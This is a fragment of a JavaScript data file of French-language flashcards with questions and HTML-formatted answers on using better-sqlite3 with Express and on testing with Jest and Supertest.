  {id:"p2_new_112",proj:"p2",num:112,category:`SQLite (better-sqlite3)`,thematique:`SQLite`,question:`Comment trier et limiter les résultats ?`,answer:`<pre>const users = db.prepare(\`
  SELECT * FROM users
  ORDER BY username ASC
  LIMIT 10 OFFSET 0
\`).all();
</pre>
<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><code>ORDER BY</code> : Trie les résultats.</li>
<li><code>LIMIT</code> : Limite le nombre de résultats.</li>
<li><code>OFFSET</code> : Pagination (saute N lignes).</li>
</ul>`,freq:"med",},
  {id:"p2_new_113",proj:"p2",num:113,category:`SQLite (better-sqlite3)`,thematique:`SQLite`,question:`Comment créer un index pour optimiser les requêtes ?`,answer:`<pre>db.exec(
  'CREATE INDEX IF NOT EXISTS idx_users_username ON users(username)'
);
</pre>
<b>Pourquoi ?</b> Un index accélère les requêtes sur la colonne <code>username</code> (ex: <code>WHERE username = 'Jean'</code>).`,freq:"med",},
  {id:"p2_new_114",proj:"p2",num:114,category:`SQLite (better-sqlite3)`,thematique:`SQLite`,question:`Comment joindre deux tables ?`,answer:`<pre>const posts = db.prepare(\`
  SELECT posts.*, users.username
  FROM posts
  JOIN users ON posts.user_id = users.id
\`).all();
</pre>`,freq:"med",},
  {id:"p2_new_115",proj:"p2",num:115,category:`SQLite (better-sqlite3)`,thematique:`SQLite`,question:`Comment fermer la connexion à la base de données ?`,answer:`<pre>db.close();  // Ferme la connexion
</pre>
<b>Important</b> : Toujours fermer la connexion quand l'application se termine (ex: script CLI), mais pour un serveur web, la connexion reste ouverte tout le temps.`,freq:"easy",},
  {id:"p2_new_116",proj:"p2",num:116,category:`SQLite (better-sqlite3)`,thematique:`SQLite`,question:`Quelles sont les bonnes pratiques avec SQLite ?`,answer:`<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><b>Requêtes paramétrées</b> — jamais de SQL dynamique.</li>
<li><b>Ferme la connexion</b> quand elle n'est plus nécessaire.</li>
<li><b>Crée des index</b> sur les colonnes fréquemment interrogées.</li>
<li><b>Évite les transactions longues</b> (peut bloquer la base).</li>
<li><b>Sauvegarde régulièrement</b> le fichier <code>.sqlite</code>.</li>
<li><b>Utilise <code>better-sqlite3</code></b> plutôt que <code>sqlite3</code> pour de meilleures performances.</li>
</ul>`,freq:"hot",},
  {id:"p2_new_117",proj:"p2",num:117,category:`SQLite (better-sqlite3)`,thematique:`SQLite`,question:`Comment utiliser \`better-sqlite3\` avec Express ?`,answer:`<pre>const express = require('express');
const Database = require('better-sqlite3');
const db = new Database('database.sqlite');
const app = express();
app.use(express.json());

// Route GET
app.get('/users', (req, res) =&gt; {
  const users = db.prepare('SELECT * FROM users').all();
  res.json(users);
});

// Route POST
app.post('/users', (req, res) =&gt; {
  const { username } = req.body;
  const info = db.prepare('INSERT INTO users (username) VALUES (?)').run(username);
  res.status(201).json({ id: info.lastInsertRowid, username });
});
</pre>`,freq:"hot",},
  {id:"p2_new_118",proj:"p2",num:118,category:`Jest & Supertest`,thematique:`Tests`,question:`Qu'est-ce que Jest ?`,answer:`<p>Jest est un <b>framework de test</b> pour JavaScript (développé par Meta/Facebook). Il permet de :</p>
<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li>Tester du code <b>synchrone et asynchrone</b>.</li>
<li>Faire des <b>tests unitaires</b> et d'<b>intégration</b>.</li>
<li><b>Mocker</b> des fonctions/modules.</li>
<li>Générer des <b>rapports de couverture</b>.</li>
</ul>`,freq:"hot",},
  {id:"p2_new_119",proj:"p2",num:119,category:`Jest & Supertest`,thematique:`Tests`,question:`Comment créer un test basique avec Jest ?`,answer:`<pre>// sum.test.js
test('adds 1 + 2 to equal 3', () =&gt; {
  expect(1 + 2).toBe(3);
});
</pre>
<p>Exécution : <code>npm test</code> ou <code>npx jest</code>.</p>`,freq:"hot",},
  {id:"p2_new_120",proj:"p2",num:120,category:`Jest & Supertest`,thematique:`Tests`,question:`Qu'est-ce que \`describe\` et \`test\` dans Jest ?`,answer:`<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><b><code>describe</code></b> : Regroupe plusieurs tests liés.</li>
<li><b><code>test</code> ou <code>it</code></b> : Définit un cas de test.</li>
<pre>describe('Fonctions mathématiques', () =&gt; {
  test('1 + 1 = 2', () =&gt; {
    expect(1 + 1).toBe(2);
  });
  it('2 × 2 = 4', () =&gt; {
    expect(2 * 2).toBe(4);
  });
});
</pre>
</ul>`,freq:"hot",},
  {id:"p2_new_121",proj:"p2",num:121,category:`Jest & Supertest`,thematique:`Tests`,question:`Quelles sont les méthodes \`expect\` les plus courantes ?`,answer:`<p>| Méthode | Description |</p>
<p>|---------|-------------|</p>
<p>| <code>.toBe()</code> | Égalité stricte (===) |</p>
<p>| <code>.toEqual()</code> | Égalité profonde (objets/tableaux) |</p>
<p>| <code>.toBeTruthy()</code> | Valeur truthy |</p>
<p>| <code>.toBeFalsy()</code> | Valeur falsy |</p>
<p>| <code>.toThrow()</code> | Lance une erreur |</p>
<p>| <code>.toContain()</code> | Tableau/string contient une valeur |</p>
<p>| <code>.toHaveProperty()</code> | Objet possède une propriété |</p>
<p>| <code>.toBeInstanceOf()</code> | Instance d'une classe |</p>`,freq:"hot",},
  {id:"p2_new_122",proj:"p2",num:122,category:`Jest & Supertest`,thematique:`Tests`,question:`Comment tester une fonction asynchrone avec Jest ?`,answer:`<pre>// Avec async/await
test('résout à lemon', async () =&gt; {
  await expect(Promise.resolve('lemon')).resolves.toBe('lemon');
});

// Avec .rejects pour les erreurs
test('rejette avec erreur', async () =&gt; {
  await expect(Promise.reject(new Error('Erreur'))).rejects.toThrow('Erreur');
});
</pre>`,freq:"hot",},
  {id:"p2_new_123",proj:"p2",num:123,category:`Jest & Supertest`,thematique:`Tests`,question:`Comment utiliser \`beforeEach\` et \`afterEach\` ?`,answer:`<pre>let database;

beforeEach(() =&gt; {
  database = new Database(':memory:');
  database.exec('CREATE TABLE users (id INTEGER)');
});

afterEach(() =&gt; {
  database.close();
});

test('insère un utilisateur', () =&gt; {
  database.prepare('INSERT INTO users (id) VALUES (?)').run(1);
  const user = database.prepare('SELECT * FROM users').get();
  expect(user.id).toBe(1);
});
</pre>`,freq:"hot",},
  {id:"p2_new_124",proj:"p2",num:124,category:`Jest & Supertest`,thematique:`Tests`,question:`Comment mocker une fonction avec Jest ?`,answer:`<pre>const mockFn = jest.fn();
mockFn('hello');
expect(mockFn).toHaveBeenCalledWith('hello');
expect(mockFn).toHaveBeenCalledTimes(1);

// Mock avec valeur de retour
const mockGet = jest.fn().mockReturnValue({ id: 1, name: 'Jean' });
expect(mockGet()).toEqual({ id: 1, name: 'Jean' });
</pre>`,freq:"med",},
  {id:"p2_new_125",proj:"p2",num:125,category:`Jest & Supertest`,thematique:`Tests`,question:`Comment mocker un module entier avec Jest ?`,answer:`<pre>jest.mock('./database', () =&gt; ({
  prepare: jest.fn(() =&gt; ({
    get: jest.fn(() =&gt; ({ id: 1, username: 'Jean' })),
    all: jest.fn(() =&gt; [{ id: 1 }]),
    run: jest.fn()
  }))
}));

const db = require('./database');
test('mock la base de données', () =&gt; {
  const user = db.prepare('SELECT...').get();
  expect(user.id).toBe(1);
});
</pre>`,freq:"med",},
  {id:"p2_new_126",proj:"p2",num:126,category:`Jest & Supertest`,thematique:`Tests`,question:`Comment mocker une Promise avec Jest ?`,answer:`<pre>const asyncMock = jest.fn().mockResolvedValue('success');

test('mock une promise', async () =&gt; {
  await expect(asyncMock()).resolves.toBe('success');
});

// Promise qui rejette
const rejectMock = jest.fn().mockRejectedValue(new Error('Erreur'));
test('mock un rejet', async () =&gt; {
  await expect(rejectMock()).rejects.toThrow('Erreur');
});
</pre>`,freq:"med",},
  {id:"p2_new_127",proj:"p2",num:127,category:`Jest & Supertest`,thematique:`Tests`,question:`Comment générer un rapport de couverture avec Jest ?`,answer:`<pre>npx jest --coverage
</pre>
<b>Résultat</b> : Un dossier <code>coverage/</code> est généré avec un rapport HTML.
<p>Configuration dans <code>package.json</code> :</p>
<pre>{
  "jest": {
    "collectCoverage": true,
    "coverageReporters": ["html", "text"],
    "coverageThreshold": {
      "global": { "lines": 80 }
    }
  }
}
</pre>`,freq:"med",},
  {id:"p2_new_128",proj:"p2",num:128,category:`Jest & Supertest`,thematique:`Tests`,question:`Comment tester les timers (setTimeout, setInterval) avec Jest ?`,answer:`<pre>jest.useFakeTimers();

test('setTimeout', () =&gt; {
  const callback = jest.fn();
  setTimeout(callback, 1000);
  jest.advanceTimersByTime(1000);
  expect(callback).toHaveBeenCalled();
});
</pre>`,freq:"med",},
  {id:"p2_new_129",proj:"p2",num:129,category:`Jest & Supertest`,thematique:`Tests`,question:`Comment sauter un test ou le marquer comme todo ?`,answer:`<pre>// Sauter un test
test.skip('ce test est ignoré', () =&gt; {
  expect(true).toBe(false);
});

// Marquer comme todo
test.todo('à implémenter plus tard');
</pre>`,freq:"easy",},
  {id:"p2_new_130",proj:"p2",num:130,category:`Jest & Supertest`,thematique:`Tests`,question:`Quelles sont les bonnes pratiques avec Jest ?`,answer:`<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><b>Un test = un cas précis</b>.</li>
<li><b>Nomme clairement</b> les tests (ex: <code>"devrait retourner 404 si l'utilisateur n'existe pas"</code>).</li>
<li><b>Utilise <code>describe</code></b> pour organiser.</li>
<li><b>Mock les dépendances externes</b> (API, base de données).</li>
<li><b>Teste les erreurs</b> avec <code>toThrow()</code>.</li>
<li><b>Génère des rapports de couverture</b> (objectif > 80%).</li>
</ul>`,freq:"hot",},
  {id:"p2_new_131",proj:"p2",num:131,category:`Jest & Supertest`,thematique:`Tests`,question:`Qu'est-ce que Supertest ?`,answer:`<p>Supertest est une <b>bibliothèque</b> pour tester les <b>serveurs HTTP</b> (Express) de manière simple. Elle simule des requêtes HTTP sans démarrer un vrai serveur réseau.</p>
<pre>npm install --save-dev supertest
</pre>`,freq:"hot",},
  {id:"p2_new_132",proj:"p2",num:132,category:`Jest & Supertest`,thematique:`Tests`,question:`Comment tester une route GET avec Supertest ?`,answer:`<pre>const request = require('supertest');
const app = require('./app');

test('GET /users retourne 200', async () =&gt; {
  const res = await request(app).get('/users');
  expect(res.statusCode).toEqual(200);
  expect(res.body).toBeInstanceOf(Array);
});
</pre>`,freq:"hot",},
  {id:"p2_new_133",proj:"p2",num:133,category:`Jest & Supertest`,thematique:`Tests`,question:`Comment tester une route POST avec Supertest ?`,answer:`<pre>test('POST /users crée un utilisateur', async () =&gt; {
  const res = await request(app)
    .post('/users')
    .send({ username: 'Jean', email: 'jean@example.com' });
  expect(res.statusCode).toEqual(201);
  expect(res.body.username).toBe('Jean');
});
</pre>`,freq:"hot",},
  {id:"p2_new_134",proj:"p2",num:134,category:`Jest & Supertest`,thematique:`Tests`,question:`Comment envoyer des headers avec Supertest ?`,answer:`<pre>test('GET /protected avec token JWT', async () =&gt; {
  const token = jwt.sign({ userId: 1 }, process.env.JWT_SECRET);
  const res = await request(app)
    .get('/protected')
    .set('Authorization', <code>Bearer \${token}</code>);
  expect(res.statusCode).toEqual(200);
});
</pre>`,freq:"hot",},
  {id:"p2_new_135",proj:"p2",num:135,category:`Jest & Supertest`,thematique:`Tests`,question:`Comment tester les erreurs 401 et 404 avec Supertest ?`,answer:`<pre>// 401 sans token
test('GET /protected sans token → 401', async () =&gt; {
  const res = await request(app).get('/protected');
  expect(res.statusCode).toEqual(401);
});

// 404 route inexistante
test('GET /inexistant → 404', async () =&gt; {
  const res = await request(app).get('/inexistant');
  expect(res.statusCode).toEqual(404);
});
</pre>`,freq:"hot",},
  {id:"p2_new_136",proj:"p2",num:136,category:`Jest & Supertest`,thematique:`Tests`,question:`Comment tester les redirections avec Supertest ?`,answer:`<pre>test('GET /old-page redirige vers /new-page', async () =&gt; {
  const res = await request(app).get('/old-page');
  expect(res.statusCode).toEqual(301);
  expect(res.headers.location).toBe('/new-page');
});
</pre>`,freq:"easy",},
  {id:"p2_new_137",proj:"p2",num:137,category:`Jest & Supertest`,thematique:`Tests`,question:`Comment tester les cookies avec Supertest ?`,answer:`<pre>test('POST /login définit un cookie', async () =&gt; {
  const res = await request(app)
    .post('/login')
    .send({ username: 'Jean', password: '123' });
  expect(res.headers['set-cookie']).toBeDefined();
});
</pre>`,freq:"med",},
  {id:"p2_new_138",proj:"p2",num:138,category:`Jest & Supertest`,thematique:`Tests`,question:`Comment chaîner les assertions avec Supertest ?`,answer:`<pre>test('chaîne des assertions', async () =&gt; {
  await request(app)
    .get('/users')
    .expect(200)                      // Vérifie le status code
    .expect('Content-Type', /json/)   // Vérifie le header
    .expect((res) =&gt; {
      if (res.body.length === 0) {
        throw new Error('Aucun utilisateur retourné');
      }
    });
});
</pre>`,freq:"med",},
  {id:"p2_new_139",proj:"p2",num:139,category:`Jest & Supertest`,thematique:`Tests`,question:`Comment tester les performances avec Supertest ?`,answer:`<pre>test('GET /users répond en moins de 500ms', async () =&gt; {
  const start = Date.now();
  const res = await request(app).get('/users');
  const duration = Date.now() - start;
  expect(duration).toBeLessThan(500);
  expect(res.statusCode).toEqual(200);
});
</pre>`,freq:"easy",},
  {id:"p2_new_140",proj:"p2",num:140,category:`Jest & Supertest`,thematique:`Tests`,question:`Quelles sont les bonnes pratiques avec Supertest ?`,answer:`<ul style="padding-left:1.2rem;margin:6px 0 10px">
<li><b>Teste chaque route</b> (GET, POST, PUT, DELETE).</li>
<li><b>Vérifie les codes HTTP</b> (200, 201, 400, 401, 404, 500).</li>
<li><b>Teste les headers</b> (Content-Type, Authorization).</li>
<li><b>Mock les dépendances externes</b> (base de données, API tierces).</li>
<li><b>Utilise <code>describe</code></b> pour organiser par route.</li>
<li><b>Teste les cas d'erreur</b> (token invalide, données manquantes).</li>
</ul>`,freq:"hot",}
];
